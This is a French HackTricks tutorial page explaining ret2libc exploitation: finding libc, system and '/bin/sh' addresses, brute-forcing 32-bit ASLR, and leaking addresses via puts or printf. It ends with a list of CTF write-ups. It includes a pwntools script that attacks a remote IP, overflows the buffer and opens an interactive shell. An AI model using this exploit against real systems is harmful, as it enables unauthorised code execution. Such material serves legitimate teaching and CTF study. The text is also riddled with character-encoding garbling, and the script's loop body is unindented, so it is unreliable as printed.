# Ret2lib

{% hint style="success" %}
Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Informations de base**

L'essence de **Ret2Libc** est de rediriger le flux d'ex√©cution d'un programme vuln√©rable vers une fonction d'une biblioth√®que partag√©e (par exemple, **system**, **execve**, **strcpy**) au lieu d'ex√©cuter un shellcode fourni par l'attaquant sur la pile. L'attaquant cr√©e une charge utile qui modifie l'adresse de retour sur la pile pour pointer vers la fonction de biblioth√®que souhait√©e, tout en veillant √† ce que les arguments n√©cessaires soient correctement configur√©s selon la convention d'appel.

### **√âtapes d'exemple (simplifi√©es)**

* Obtenir l'adresse de la fonction √† appeler (par exemple, system) et la commande √† appeler (par exemple, /bin/sh)
* G√©n√©rer une cha√Æne ROP pour passer le premier argument pointant vers la cha√Æne de commande et le flux d'ex√©cution √† la fonction

## Trouver les adresses

* Supposons que la `libc` utilis√©e soit celle de la machine actuelle, vous pouvez trouver o√π elle sera charg√©e en m√©moire avec :

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

Si vous voulez v√©rifier si l'ASLR change l'adresse de la libc, vous pouvez faire :
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* En connaissant la libc utilis√©e, il est √©galement possible de trouver le d√©calage de la fonction `system` avec :
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* En connaissant la libc utilis√©e, il est √©galement possible de trouver le d√©calage de la fonction de la cha√Æne `/bin/sh` avec :
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### Utilisation de gdb-peda / GEF

En connaissant la libc utilis√©e, il est √©galement possible d'utiliser Peda ou GEF pour obtenir l'adresse de la fonction **system**, de la fonction **exit** et de la cha√Æne **`/bin/sh`** :
```bash
p system
p exit
find "/bin/sh"
```
### Utilisation de /proc/\<PID>/maps

Si le processus cr√©e des **enfants** √† chaque fois que vous communiquez avec lui (serveur r√©seau), essayez de **lire** ce fichier (vous devrez probablement √™tre root).

Ici, vous pouvez trouver **exactement o√π est charg√© le libc** √† l'int√©rieur du processus et **o√π il va √™tre charg√©** pour chaque enfant du processus.

![](<../../../.gitbook/assets/image (853).png>)

Dans ce cas, il est charg√© √† **0xb75dc000** (ce sera l'adresse de base du libc)

## Libc inconnu

Il est possible que vous **ne connaissiez pas le libc charg√© par le binaire** (car il pourrait √™tre situ√© sur un serveur auquel vous n'avez pas acc√®s). Dans ce cas, vous pourriez exploiter la vuln√©rabilit√© pour **d√©voiler certaines adresses et trouver quelle biblioth√®que libc** est utilis√©e :

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

Et vous pouvez trouver un mod√®le pwntools pour cela dans :

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

### Conna√Ætre le libc avec 2 offsets

Consultez la page [https://libc.blukat.me/](https://libc.blukat.me/) et utilisez **quelques adresses** de fonctions √† l'int√©rieur du libc pour d√©couvrir la **version utilis√©e**.

## Contourner l'ASLR en 32 bits

Ces attaques par force brute ne sont **utiles que pour les syst√®mes 32 bits**.

* Si l'exploit est local, vous pouvez essayer de forcer par la force brute l'adresse de base du libc (utile pour les syst√®mes 32 bits) :
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Lors de l'attaque d'un serveur distant, vous pourriez essayer de **forcer l'adresse de la fonction `usleep` de la `libc`**, en passant 10 comme argument (par exemple). Si √† un moment donn√© le **serveur met 10 secondes suppl√©mentaires √† r√©pondre**, vous avez trouv√© l'adresse de cette fonction.

## One Gadget

Ex√©cutez un shell en sautant simplement √† **une** adresse sp√©cifique dans la libc :

{% content-ref url="one-gadget.md" %}
[one-gadget.md](one-gadget.md)
{% endcontent-ref %}

## Exemple de code x86 Ret2lib

Dans cet exemple, le brute-force de l'ASLR est int√©gr√© dans le code et le binaire vuln√©rable est situ√© sur un serveur distant :
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## Exemple de code x64 Ret2lib

Consultez l'exemple √† partir de :

{% content-ref url="../" %}
[..](../)
{% endcontent-ref %}

## Exemple ARM64 Ret2lib

Dans le cas de l'ARM64, l'instruction ret saute √† l'endroit o√π le registre x30 pointe et non √† l'endroit o√π le registre de la pile pointe. C'est donc un peu plus compliqu√©.

√âgalement en ARM64, une instruction fait ce que l'instruction fait (il n'est pas possible de sauter au milieu des instructions et de les transformer en nouvelles).

Consultez l'exemple √† partir de :

{% content-ref url="ret2lib-+-printf-leak-arm64.md" %}
[ret2lib-+-printf-leak-arm64.md](ret2lib-+-printf-leak-arm64.md)
{% endcontent-ref %}

## Ret-into-printf (ou puts)

Cela permet de **fuir des informations du processus** en appelant `printf`/`puts` avec des donn√©es sp√©cifiques plac√©es en argument. Par exemple, mettre l'adresse de `puts` dans la GOT dans un appel de `puts` va **fuir l'adresse de `puts` en m√©moire**.

## Ret2printf

Cela signifie essentiellement abuser d'un **Ret2lib pour le transformer en une vuln√©rabilit√© de cha√Ænes de format `printf`** en utilisant le `ret2lib` pour appeler printf avec les valeurs √† exploiter (semble inutile mais possible) :

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## Autres exemples et r√©f√©rences

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2lib, donnant une fuite vers l'adresse d'une fonction dans libc, en utilisant un gadget unique
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 bits, ASLR activ√© mais pas de PIE, la premi√®re √©tape est de remplir un d√©passement jusqu'au byte 0x00 du canary pour ensuite appeler puts et le fuir. Avec le canary, un gadget ROP est cr√©√© pour appeler puts et fuir l'adresse de puts de la GOT, puis un gadget ROP pour appeler `system('/bin/sh')`
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 bits, ASLR activ√©, pas de canary, d√©bordement de pile dans main √† partir d'une fonction enfant. Gadget ROP pour appeler puts et fuir l'adresse de puts de la GOT, puis appeler un gadget unique.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64 bits, pas de PIE, pas de canary, pas de relro, nx. Utilise la fonction write pour fuir l'adresse de write (libc) et appelle un gadget unique.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html)
* Utilise une cha√Æne de format pour fuir le canary de la pile et un d√©passement de tampon pour appeler system (il est dans la GOT) avec l'adresse de `/bin/sh`.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html)
* 32 bits, pas de relro, pas de canary, nx, pie. Abuser d'un mauvais indexage pour fuir les adresses de libc et du tas de la pile. Abuser du d√©passement de tampon pour faire un ret2lib en appelant `system('/bin/sh')` (l'adresse du tas est n√©cessaire pour contourner une v√©rification).
